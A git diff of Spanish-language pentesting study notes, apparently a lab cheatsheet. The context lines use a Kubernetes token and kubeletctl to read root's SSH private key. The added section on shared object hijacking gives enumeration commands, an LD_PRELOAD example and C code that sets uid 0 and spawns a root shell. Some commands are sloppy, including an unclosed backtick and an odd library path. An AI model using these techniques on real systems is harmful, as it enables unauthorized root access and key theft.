@@ -129,3 +129,20 @@ spec:
 ##### Creando nuevo pod
 - `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml`
 - `kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc`
+
+## Shared Object Hijacking
+- Definición: Shared Object Hijacking es un ataque que permite a un atacante inyectar código malicioso en un proceso que está ejecutando un binario compartido (como un servidor web o un servidor de bases de datos) para que el código se ejecute en el contexto del proceso.
+- Podemos utilizar ldd para encontrar las librerías compartidas del binario: `ldd /usr/bin/binario
+- Podemos encontrar las rutas de las librerías compartidas del binario: `strings /usr/bin/binario | grep "Shared object" | cut -d ":" -f 2`
+- Si encontramos alguna libreria interesante pdemos cargar una libreria compartida personalizada, por ejemplo `LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libmysqlclient.so.20.so /usr/bin/binario`
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+} 
+```
